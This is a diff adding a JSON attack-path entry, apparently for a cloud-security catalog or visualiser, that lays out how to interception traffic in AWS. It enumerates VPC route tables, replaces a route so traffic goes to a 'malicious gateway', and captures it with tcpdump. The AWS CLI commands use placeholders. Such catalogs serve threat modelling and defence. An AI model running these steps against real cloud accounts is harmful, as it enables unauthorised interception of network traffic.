@@ -1,0 +1,47 @@
+{
+    "title": "Exploit VPC Route Table to Redirect Traffic",
+    "icon": "https://img.icons8.com/?size=100&id=wNzRBdhcbwic&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "List VPC Route Tables",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/list.png",
+            "details": {
+                "command": "aws ec2 describe-route-tables",
+                "description": "Lists all route tables in the specified region.",
+                "services": ["VPC"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-route-tables.html"
+            }
+        },
+        {
+            "id": 3,
+            "label": "Modify Route Table to Redirect Traffic",
+            "icon": "https://img.icons8.com/?size=100&id=96467&format=png&color=000000",
+            "details": {
+                "command": "aws ec2 replace-route --route-table-id <RouteTableId> --destination-cidr-block <CIDR> --gateway-id <GatewayId>",
+                "description": "Modifies the route table to redirect traffic to a malicious gateway.",
+                "services": ["VPC"],
+                "attack_types": ["Traffic Interception"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/ec2/replace-route.html"
+            }
+        },
+        {
+            "id": 4,
+            "label": "Intercept Traffic",
+            "icon": "https://img.icons8.com/?size=100&id=0MCtNCyPiMjF&format=png&color=000000",
+            "details": {
+                "command": "tcpdump -i eth0",
+                "description": "Intercepts network traffic using the modified route table.",
+                "services": ["VPC"],
+                "attack_types": ["Traffic Interception"]
+            }
+        }
+    ]
+}
